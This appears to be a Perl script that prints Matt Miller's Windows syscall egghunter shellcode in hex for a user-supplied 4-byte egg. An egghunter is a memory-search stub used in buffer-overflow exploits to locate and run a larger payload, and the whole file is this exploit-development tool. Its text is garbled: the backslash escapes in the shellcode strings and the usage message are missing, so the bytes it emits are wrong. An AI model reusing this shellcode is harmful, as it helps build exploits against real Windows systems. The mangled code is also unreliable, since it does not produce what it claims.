#!/usr/bin/perl
# Provides Matt Miller (skapes) Windows syscall egghunter in hex format
if ($ARGV[0] !~ m/^0x[0-9A-Fa-f]{8}$/) {
    die("Usage: $0 eggnnWhere egg is a 32 bit (4 byte) value in hex.nExample: $0 0x41414242\n\n");
}

$egg = "x66x81xcaxffx0fx42x52x6ax02x58xcdx2ex3cx05x5ax74xefxb8";
$egg .= pack('N', hex($ARGV[0]));
$egg .= "x8bxfaxafx75xeaxafx75xe7xffxe7";
print "Size: " . length($egg) . "\n\n" . texttohex($egg) . "\n";

sub texttohex {
    my $out;
    my @bits = split //, $_[0];
    foreach $bit (@bits) {
        $out = $out . 'x' . sprintf("%02x", ord($bit));
    }
    return $out;
}